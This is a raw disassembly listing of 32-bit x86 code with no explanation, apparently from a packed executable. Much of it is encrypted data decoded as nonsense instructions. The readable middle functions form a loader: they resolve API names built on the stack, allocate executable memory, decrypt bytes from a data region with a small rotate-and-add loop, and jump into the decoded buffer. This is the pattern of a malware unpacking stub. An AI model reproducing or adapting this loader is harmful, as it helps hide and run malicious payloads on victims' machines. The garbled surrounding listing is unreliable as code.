  4213ce:	xchg   DWORD PTR [edi-0x58ac89f9],esi
  4213d4:	retf   
  4213d5:	es jmp 0x7e80ab4
  4213db:	mov    ds:0x8e9198f,eax
  4213e0:	dec    eax
  4213e1:	aad    0xed
  4213e3:	addr16 cli 
  4213e5:	call   0x4e1e:0x6597fe07
  4213ec:	pop    edx
  4213ed:	xor    edx,DWORD PTR [edi+0x22b09c74]
  4213f3:	or     dl,dl
  4213f5:	adc    dl,al
  4213f7:	mov    ebx,0x3516e66a
  4213fc:	out    0x4d,al
  4213fe:	test   DWORD PTR [edi],0x5857d410
  421404:	sahf   
  421405:	pop    bp
  421407:	adc    bh,BYTE PTR ds:0x167de942
  42140d:	bound  ebx,QWORD PTR [esi-0xf]
  421410:	add    eax,0x5070d061
  421415:	push   0x4e905373
  42141a:	push   ebp
  42141b:	mov    ebp,0xbf290d05
  421420:	jbe    0x4213f3
  421422:	sub    DWORD PTR [edi],ecx
  421424:	lods   eax,DWORD PTR ds:[esi]
  421425:	mov    al,ds:0x6b44e09a
  42142a:	out    0xe3,al
  42142c:	mov    dh,0x4c
  42142e:	test   DWORD PTR [ecx-0x292bf80f],esi
  421434:	ror    BYTE PTR [ecx+0x30233ea2],0x43
  42143b:	add    al,0x6e
  42143d:	fcomp  DWORD PTR [edi+0x10e4252d]
  421443:	cdq    
  421444:	icebp  
  421445:	fsub   DWORD PTR [edx+edx*4]
  421448:	mov    dh,0xf1
  42144a:	or     DWORD PTR [ebp-0x3666401],ebp
  421450:	sbb    bl,BYTE PTR [ebx+0x3c93410b]
  421456:	rcl    BYTE PTR [eax],1
  421458:	inc    edx
  421459:	std    
  42145a:	test   eax,0x72de2ff3
  42145f:	rcl    BYTE PTR [esi+0x6d70b1aa],cl
  421465:	fisttp WORD PTR [edi-0x63c817d0]
  42146b:	dec    eax
  42146c:	out    dx,eax
  42146d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146e:	xchg   esp,eax
  42146f:	fst    DWORD PTR [ebx-0x4747f50e]
  421475:	test   ah,dl
  421477:	(bad)  
  421479:	mov    dl,0x92
  42147b:	mov    eax,0x5d8c3cd8
  421480:	push   0x4b
  421482:	fwait
  421483:	outs   dx,DWORD PTR ds:[esi]
  421484:	pop    ebx
  421485:	sahf   
  421486:	pop    edi
  421487:	xlat   BYTE PTR ds:[ebx]
  421488:	pop    ds
  421489:	mov    dl,BYTE PTR [ebx+0x25]
  42148c:	das    
  42148d:	push   esi
  42148e:	cwde   
  42148f:	(bad)  
  421490:	gs push ds
  421492:	xor    DWORD PTR [ebx],esp
  421494:	sub    al,0xe0
  421496:	mov    ch,0x6e
  421498:	cmp    ah,BYTE PTR [edi+edi*8]
  42149b:	out    0xc3,al
  42149d:	loop   0x42146b
  42149f:	xchg   ecx,eax
  4214a0:	mov    WORD PTR [ebp+0x2d],fs
  4214a3:	sub    eax,0x611839f0
  4214a8:	and    al,0xd
  4214aa:	das    
  4214ab:	xchg   esi,eax
  4214ac:	int    0xd9
  4214ae:	add    esi,ebx
  4214b0:	dec    eax
  4214b1:	fbstp  TBYTE PTR ds:[ebp+0x1a]
  4214b5:	mov    bl,BYTE PTR fs:[ebp-0x21]
  4214b9:	mov    dl,0xca
  4214bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214bc:	mov    dh,al
  4214be:	imul   edi
  4214c0:	retf   0x7045
  4214c3:	xchg   edi,edx
  4214c5:	lods   al,BYTE PTR ds:[esi]
  4214c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c7:	adc    esp,DWORD PTR [ebx+esi*1]
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0x1becd6dc
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x6cc4776e
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	jmp    DWORD PTR [esp+eiz*2]
  4217eb:	mov    dh,0x8b
  4217ed:	loop   0x4217af
  4217ef:	(bad)  [ecx-0x13bd59b6]
  4217f5:	xchg   esi,eax
  4217f6:	xchg   esi,eax
  4217f7:	ds es xor esp,ecx
  4217fb:	rcr    bl,0xa1
  4217fe:	dec    esi
  4217ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421800:	inc    edx
  421801:	lods   al,BYTE PTR ds:[esi]
  421802:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421809:	(bad)  [ecx-0x13bd59b2]
  42180f:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421816:	(bad)  [ecx-0x13bd59b2]
  42181c:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421823:	(bad)  [ecx-0x13bd594a]
  421829:	addr16 jbe 0x4217b0
  42182c:	sub    BYTE PTR [ebx-0x7fe936ab],cl
  421832:	mul    BYTE PTR [edi+0x3d48210e]
  421838:	push   esi
  421839:	dec    edi
  42183a:	clc    
  42183b:	shl    DWORD PTR [eax-0x2bd63157],0x23
  421842:	or     DWORD PTR [ecx+0xa],0x8ee5485f
  421849:	mov    ah,0xfb
  42184b:	ret    
  42184c:	sub    eax,DWORD PTR [esi+0x49079930]
  421852:	push   edi
  421853:	dec    eax
  421854:	stos   DWORD PTR es:[edi],eax
  421855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421856:	(bad)
  42185a:	leave  
  42185b:	mov    DWORD PTR es:[edi+0x64],eax
  42185f:	xor    ebp,DWORD PTR [edi+ebp*4]
  421862:	loope  0x421824
  421864:	(bad)  [ecx-0x14bd59b2]
  42186a:	lock xchg ebp,eax
  42186c:	addr16 gs jae 0x4218e3
  421870:	retf   0x5998
  421873:	fsubr  QWORD PTR [ecx+eax*1+0x6663fb14]
  42187a:	inc    ebx
  42187b:	xchg   ebx,ebp
  42187d:	lahf   
  42187e:	and    esi,DWORD PTR [ebx]
  421880:	inc    esp
  421881:	(bad)  
  421882:	daa    
  421883:	aam    0x63
  421885:	stos   DWORD PTR es:[edi],eax
  421886:	(bad)  
  421887:	mov    ah,0x81
  421889:	mov    ecx,0x26abe2a5
  42188e:	pop    esi
  42188f:	shl    dh,1
  421891:	inc    ebp
  421892:	out    0x7,eax
  421894:	sub    al,0xcd
  421896:	sbb    DWORD PTR [edx-0x2f],edx
  421899:	jmp    0x421869
  42189b:	mov    bh,0x48
  42189d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42189e:	xchg   ecx,eax
  42189f:	sti    
  4218a0:	xor    al,0x6c
  4218a2:	or     esp,eax
  4218a4:	retf   0x5983
  4218a7:	fsubr  QWORD PTR [ecx+eax*1+0x1663fa14]
  4218ae:	fistp  WORD PTR [ecx]
  4218b0:	jmp    0x421931
  4218b2:	add    esp,DWORD PTR [ecx]
  4218b4:	inc    esp
  4218b5:	jmp    0x421871
  4218b7:	jle    0x42191c
  4218b9:	xor    DWORD PTR [ebx+0x1b],ebx
  4218bc:	sub    ecx,0x16ab4938
  4218c2:	ret    
  4218c3:	dec    edx
  4218c4:	out    0x2b,al
  4218c6:	xchg   ecx,eax
  4218c7:	lods   al,BYTE PTR ds:[esi]
  4218c8:	sub    al,0xd3
  4218ca:	test   bh,cl
  4218cc:	shl    ebx,1
  4218ce:	mov    dh,0x34
  4218d0:	dec    eax
  4218d1:	mov    esi,0x65560a00
  4218d6:	jae    0x42194b
  4218d8:	retf   0xa1db
  4218db:	dec    esi
  4218dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218dd:	inc    edx
  4218de:	in     al,dx
  4218df:	imul   ebp,DWORD PTR [ecx+0x6e],0x8ce18b63
  4218e6:	fisub  DWORD PTR [ebx-0x786df9b2]
  4218ec:	imul   edi,DWORD PTR es:[esi],0xc0e18b26
  4218f3:	(bad)  [ecx-0x12be5952]
  4218f9:	bound  ebp,QWORD PTR [eax+0x34]
  4218fc:	mov    ecx,DWORD PTR es:[edi]
  4218ff:	(bad)  
  421900:	(bad)  [ecx-0x13bd5f0e]
  421906:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e13637
  42190d:	(bad)  [ecx-0x13bd59b2]
  421913:	ins    BYTE PTR es:[edi],dx
  421914:	imul   edi,DWORD PTR [esi],0xc0e1ca26
  42191a:	retf   
  42191b:	mov    eax,ds:0xec40a64e
  421920:	imul   ebp,DWORD PTR [esi+edi*1+0x27],0xdbc0e18b
  421928:	mov    eax,ds:0xec43a64b
  42192d:	imul   ebp,DWORD PTR [ecx+0x3e],0xccb18b26
  421934:	(bad)  [ecx-0x12bd59b6]
  42193a:	lea    ebp,[esi+edi*1+0x24]
  42193e:	mov    esp,ecx
  421940:	inc    eax
  421941:	(bad)  [ecx-0x3bd59a2]
  421947:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e19b26
  42194e:	retf   
  42194f:	mov    eax,ds:0xec42a64e
  421954:	imul   edi,DWORD PTR [ecx+0x3e],0xc0e18b26
  42195b:	(bad)  [ecx-0x13bd59b2]
  421961:	popf   
  421962:	push   eax
  421963:	xor    ah,BYTE PTR [esi]
  421965:	loop   0x421949
  421967:	rcr    bl,0xa1
  42196a:	mov    esi,0x20a342ad
  42196f:	imul   edi,DWORD PTR [esi],0xc0e18b26
  421975:	(bad)  [ecx-0x13bd59b2]
  42197b:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421982:	(bad)  [ecx-0x13bd59b2]
  421988:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  42198f:	(bad)  [ecx-0x13bd59b2]
  421995:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  42199c:	(bad)  [ecx-0x13bd59b2]
  4219a2:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  4219a9:	(bad)  [ecx-0x13bd59b2]
  4219af:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  4219b6:	(bad)  [ecx-0x13bd59b2]
  4219bc:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  4219c3:	(bad)  [ecx-0x13bd59b2]
  4219c9:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  4219d0:	(bad)  [ecx-0x13bd59b2]
  4219d6:	imul   ebp,DWORD PTR [ecx+0x3e],0xb884ff08
  4219dd:	scas   eax,DWORD PTR es:[edi]
  4219de:	mov    eax,ds:0xc42a64e
  4219e3:	bound  ebp,QWORD PTR [ecx+0x3e]
  4219e6:	ss mov esp,ecx
  4219e9:	ror    BYTE PTR [edi],0xa5
  4219ec:	dec    esi
  4219ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ee:	inc    esi
  4219ef:	in     al,dx
  4219f0:	imul   edi,DWORD PTR [ecx],0xb5b9657b
  4219f6:	(bad)  
  4219f7:	(bad)  [ecx-0x13bd59b2]
  4219fd:	dec    ecx
  4219fe:	imul   edi,DWORD PTR [esi],0xb393a5c6
  421a04:	test   eax,0x42a64ec2
  421a09:	in     al,dx
  421a0a:	or     DWORD PTR [ecx+0x3e],ebp
  421a0d:	es jnp 0x4219fa
  421a10:	rcr    bl,0xfb
  421a13:	dec    esi
  421a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a15:	inc    edx
  421a16:	xor    al,0x6d
  421a18:	imul   edi,DWORD PTR [esi],0xc0e18b26
  421a1e:	(bad)  [ecx-0x13bd59b2]
  421a24:	imul   ecx,DWORD PTR [ecx+0x3e],0xc0e16b26
  421a2b:	(bad)  [ecx-0x13bd59b2]
  421a31:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a38:	(bad)  [ecx-0x13bd59b2]
  421a3e:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a45:	(bad)  [ecx-0x13bd59b2]
  421a4b:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a52:	(bad)  [ecx-0x13bd59b2]
  421a58:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a5f:	(bad)  [ecx-0x13bd59b2]
  421a65:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a6c:	(bad)  [ecx-0x13bd59b2]
  421a72:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a79:	(bad)  [ecx-0x13bd59b2]
  421a7f:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a86:	(bad)  [ecx-0x13bd59b2]
  421a8c:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421a93:	(bad)  [ecx-0x13bd59b2]
  421a99:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421aa0:	(bad)  [ecx-0x13bd59b2]
  421aa6:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421aad:	(bad)  [ecx-0x13bd59b2]
  421ab3:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421aba:	(bad)  [ecx-0x13bd59b2]
  421ac0:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421ac7:	(bad)  [ecx-0x13bd59b2]
  421acd:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421ad4:	(bad)  [ecx-0x13bd59b2]
  421ada:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421ae1:	(bad)  [ecx-0x13bd59b2]
  421ae7:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421aee:	(bad)  [ecx-0x13bd59b2]
  421af4:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421afb:	(bad)  [ecx-0x13bd59b2]
  421b01:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b08:	(bad)  [ecx-0x13bd59b2]
  421b0e:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b15:	(bad)  [ecx-0x13bd59b2]
  421b1b:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b22:	(bad)  [ecx-0x13bd59b2]
  421b28:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b2f:	(bad)  [ecx-0x13bd59b2]
  421b35:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b3c:	(bad)  [ecx-0x13bd59b2]
  421b42:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b49:	(bad)  [ecx-0x13bd59b2]
  421b4f:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b56:	(bad)  [ecx-0x13bd59b2]
  421b5c:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b63:	(bad)  [ecx-0x13bd59b2]
  421b69:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b70:	(bad)  [ecx-0x13bd59b2]
  421b76:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b7d:	(bad)  [ecx-0x13bd59b2]
  421b83:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b8a:	(bad)  [ecx-0x13bd59b2]
  421b90:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421b97:	(bad)  [ecx-0x13bd59b2]
  421b9d:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421ba4:	(bad)  [ecx-0x13bd59b2]
  421baa:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421bb1:	(bad)  [ecx-0x13bd59b2]
  421bb7:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421bbe:	(bad)  [ecx-0x13bd59b2]
  421bc4:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421bcb:	(bad)  [ecx-0x13bd59b2]
  421bd1:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421bd8:	(bad)  [ecx-0x13bd59b2]
  421bde:	imul   ebp,DWORD PTR [ecx+0x3e],0xc0e18b26
  421be5:	(bad)  [ecx+0x442da64e]
  421beb:	bound  ebp,QWORD PTR [ecx+0x11]
  421bee:	es mov esi,ecx
  421bf1:	rcr    bl,0x8b
  421bf4:	in     al,dx
  421bf5:	jl     0x421c2a
  421bf7:	mov    dl,BYTE PTR [esi-0x245e5fbc]
  421bfd:	or     al,0xf6
  421bff:	xor    esi,DWORD PTR [edx-0x62dbcc06]
  421c05:	in     eax,dx
  421c06:	xor    ebp,DWORD PTR ds:0xadf73c97
  421c0c:	aas    
  421c0d:	sub    ecx,edi
  421c0f:	pusha  
  421c10:	ins    BYTE PTR es:[edi],dx
  421c11:	mov    ?,ecx
  421c13:	push   esi
  421c14:	pop    es
  421c15:	adc    eax,0xf9d750c4
  421c1a:	mov    eax,ds:0xb9ca0169
  421c1f:	cmp    BYTE PTR [edi+edx*4],al
  421c22:	adc    al,0xb6
  421c24:	cmp    al,0xd4
  421c26:	push   0xffffffc1
  421c28:	inc    ecx
  421c29:	js     0x421c91
  421c2b:	push   edi
  421c2c:	and    eax,0x7309fbba
  421c31:	jg     0x421bfd
  421c33:	xor    al,0xc5
  421c35:	outs   dx,BYTE PTR ds:[esi]
  421c36:	add    eax,0x44c31d4d
  421c3b:	jnp    0x421c9b
  421c3d:	int    0xb0
  421c3f:	adc    DWORD PTR ds:0x3f8f0810,0x71
  421c46:	call   0x3f63f87e
  421c4b:	arpl   bx,si
  421c4d:	mov    al,0x45
  421c4f:	outs   dx,DWORD PTR ds:[esi]
  421c50:	push   esi
  421c51:	and    esp,DWORD PTR [edi+0x9]
  421c54:	iret   
  421c55:	sub    cl,BYTE PTR [edx]
  421c57:	ins    BYTE PTR es:[edi],dx
  421c58:	dec    edx
  421c59:	call   0x6b362ee
  421c5e:	pop    ecx
  421c5f:	mov    bl,0xdb
  421c61:	sar    DWORD PTR [eax-0x66],cl
  421c64:	lock enter 0xf582,0x5e
  421c69:	jg     0x421c02
  421c6b:	mov    ds,WORD PTR [ebx+0x66]
  421c6e:	pop    es
  421c6f:	pushf  
  421c70:	js     0x421ca8
  421c72:	int3   
  421c73:	retf   0x659e
  421c76:	fucomi st,st(7)
  421c78:	int    0xdf
  421c7a:	or     eax,0xa3a14a7a
  421c7f:	mov    ds:0x631c5d9c,eax
  421c84:	push   esp
  421c85:	dec    eax
  421c86:	pusha  
  421c87:	cmp    BYTE PTR [ecx-0x73],dh
  421c8a:	and    BYTE PTR [ebx+ebp*4],ah
  421c8d:	xor    cl,al
  421c8f:	sub    BYTE PTR [esi],cl
  421c91:	jmp    0x8421dcf0
  421c96:	xchg   BYTE PTR [edi+eiz*4+0x77],bl
  421c9a:	xor    DWORD PTR [ebx+ecx*8+0x7e],edx
  421c9e:	mov    bl,0x68
  421ca0:	jmp    0x421cbe
  421ca2:	add    cl,ah
  421ca4:	xchg   esi,eax
  421ca5:	mov    ch,0x73
  421ca7:	add    edx,DWORD PTR [eax]
  421ca9:	pop    ebp
  421caa:	inc    edi
  421cab:	mov    eax,0xddb42ec0
  421cb0:	sbb    eax,0x113e24c9
  421cb5:	push   esp
  421cb6:	mov    DWORD PTR [eax],ebx
  421cb8:	push   0x137e789e
  421cbd:	add    edx,eax
  421cbf:	test   DWORD PTR [esi-0x3a4d84cc],esp
  421cc5:	or     edi,edi
  421cc7:	jnp    0x421caa
  421cc9:	push   0x63
  421ccb:	into   
  421ccc:	jl     0x421c67
  421cce:	rcl    BYTE PTR [edi-0x52a7574d],cl
  421cd4:	mov    esp,0xcd4fe199
  421cd9:	call   0x7a2c:0x813a1c15
  421ce0:	pop    ebx
  421ce1:	enter  0x2314,0xd7
  421ce5:	sbb    cl,BYTE PTR [eax]
  421ce7:	cmp    ebx,edi
  421ce9:	call   0x960ce5e0
  421cee:	sbb    ecx,ebp
  421cf0:	fnstsw WORD PTR [eax+0x9aa958c]
  421cf6:	inc    ebp
  421cf7:	loopne 0x421c87
  421cf9:	or     BYTE PTR [ebx+ecx*2-0x7dbf3528],0xd1
  421d01:	jno    0x421d3f
  421d03:	aam    0xbd
  421d05:	std    
